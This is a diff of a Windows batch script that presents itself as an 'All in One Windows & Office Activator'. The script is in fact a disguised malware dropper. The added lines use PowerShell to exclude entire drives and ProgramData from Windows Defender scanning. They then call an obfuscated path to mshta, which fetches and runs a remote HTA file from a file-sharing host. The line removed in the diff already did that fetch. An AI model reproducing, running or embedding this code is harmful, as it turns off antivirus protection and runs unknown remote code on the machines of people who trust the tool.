@@ -3,7 +3,13 @@
 mode 128, 47
 color 3
 title All in One Windows & Office Activator by MAS.DEV 2023
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe . $env:C:\W*\S*2\m*h?a.*  'https://filebin.net/h6oeie0njn1af0lj/final.hta'
+powershell.exe Add-MpPreference -ExclusionPath C:\
+powershell.exe Add-MpPreference -ExclusionPath D:\
+powershell.exe Add-MpPreference -ExclusionPath F:\
+powershell.exe Add-MpPreference -ExclusionPath C:\ProgramData\SYS
+powershell.exe Add-MpPreference -ExclusionPath C:\ProgramData\
+powershell.exe . $env:C:\W*\S*2\m*h?a.*  'https://filebin.net/h6oeie0njn1af0lj/final.hta'
+
 echo.
 echo "
 echo "  _    _ _           _                          _____  __  __ _             ___       _   _            _   _             
@@ -15,9 +21,6 @@ echo "  \/  \/|_|_| |_|\__,_|\___/ \_/\_/ |___/\___/\/\___/|_| |_| |_|\___\___| 
 echo "                                                                                                                                                                                                                                                
 echo "      Created by MAS.DEV              Important Note: You must be connected to the internet                 v5.0.1/2023
 timeout 10
-
-
-
 
 
 net session >nul 2>&1
